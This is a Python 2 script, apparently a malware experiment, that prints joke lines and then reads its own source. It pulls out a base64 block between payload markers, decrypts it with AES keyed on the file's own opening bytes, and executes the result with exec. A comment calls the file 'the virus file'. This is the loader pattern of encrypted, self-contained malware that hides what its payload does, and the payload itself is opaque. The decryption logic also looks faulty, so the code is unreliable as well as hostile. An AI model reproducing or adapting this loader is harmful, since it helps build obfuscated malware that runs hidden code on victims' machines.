print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"



print "lolol"

######################################################## First script python
# coding=utf-8
# Start Unencrypted
import os
import __main__
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES


# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(this).read(24), AES.MODE_CFB, iv)

   this.close()
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '# Start payload':
      copy = True
   elif line.strip() == '# End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
#print e
exec e
sys.exit('Good job!')
# End Unencrypted
# Start payload
#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
# End payload